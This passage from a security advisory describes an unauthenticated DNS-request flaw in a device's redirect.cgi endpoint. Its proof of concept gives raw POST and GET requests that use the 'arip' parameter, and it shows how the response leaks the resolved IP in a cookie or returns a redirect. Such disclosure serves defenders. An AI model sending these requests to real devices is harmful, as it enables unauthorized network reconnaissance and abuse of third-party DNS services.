Vulnerability overview/description:
-----------------------------------
1) Information Disclosure via Unauthenticated External DNS Requests
A DNS request can be made by an unauthenticated attacker to either spam a DNS
service of a third party with requests that have a spoofed origin or probe


Proof of concept:
-----------------
1) Information Disclosure via Unauthenticated External DNS Requests
By sending the following POST request an attacker can probe for the domain
"subdomain.domain.com":
-------------------------------------------------------------------------------
POST /redirect.cgi?original_url=http%3a%2f%2f192.168.1.1%2f HTTP/1.1
Host: 192.168.1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

arip=subdomain.domain.com
-------------------------------------------------------------------------------

The following GET request can be used for the same purpose:
-------------------------------------------------------------------------------
GET /redirect.cgi?arip=subdomain.domain.com&original_url=http%3a%2f%2f192.168.1.1%2f HTTP/1.1
Host: 192.168.1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
Connection: close
Cache-Control: max-age=0
-------------------------------------------------------------------------------

If the domain can be resolved, the response contains the resolved IP address
within the cookie value:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Date: Mon, 24 Jun 2019 08:14:33 GMT
Cache-Control: no-cache, private
Pragma: no-cache
Expires: Mon, 16 Apr 1973 13:10:00 GMT
Set-Cookie: arip=<IP-of-subdomain.domain.com>; path=/
Set-Cookie: zy_pc_browser=1; path=/
Connection: close
Content-Type: text/html
Content-Length: 9099

[...]
-------------------------------------------------------------------------------

If the domain cannot be resolved, a redirection will be returned:
-------------------------------------------------------------------------------
HTTP/1.1 302 Found
Date: Mon, 24 Jun 2019 08:11:57 GMT
Location: ext-js/app/view/login/useraware.html
